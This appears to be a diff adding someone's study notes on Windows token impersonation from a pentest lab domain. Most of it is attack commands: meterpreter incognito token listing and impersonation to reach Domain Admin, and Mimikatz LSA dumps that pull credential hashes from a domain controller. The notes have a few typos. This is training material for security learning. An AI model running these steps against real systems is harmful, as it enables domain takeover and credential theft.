@@ -1,0 +1,48 @@
+
+Token Impersonation : 
+
+What are tokens ? 
+
+Temporary keys that allows you access to a system/network without having to provide credentials each time you access a file.
+think cookies for computer. 
+
+Two Types : 
+
+1. Delegate : Created for logging into a machine or using remote desktop 
+2. impersonate : "non interactive" such as attaching a network drive or a domain logoon script 
+
+Command in meterpreter : 
+
+Pop up a shell and load icognito : 
+meterpreter> load icognito 
+
+Impersonate our domain user : 
+meterpreter> impersonate_token marvel\\fcastle 
+
+Attempt to dump hashes as non-Domain Admin : 
+C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADunp::LSA /inject" exit' -Computer HYDRA.marvel.local 
+
+list tokens and identify Domain administrator : 
+meterpreter> list_tokens -u
+
+impersonate our Domain administrator : 
+impersonate_token MARVEL\\Administrator
+
+Attemp to dump hashes as Domain Admin : 
+C:\> Invoke-mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local
+
+
+
+
+Impersonation-Privileges : 
+
+Suppose that we have pawned the machine and we have user level access : 
+Command in cmd : 
+	-> whoami /priv
+
+
+
+ 
+	 
+  
+
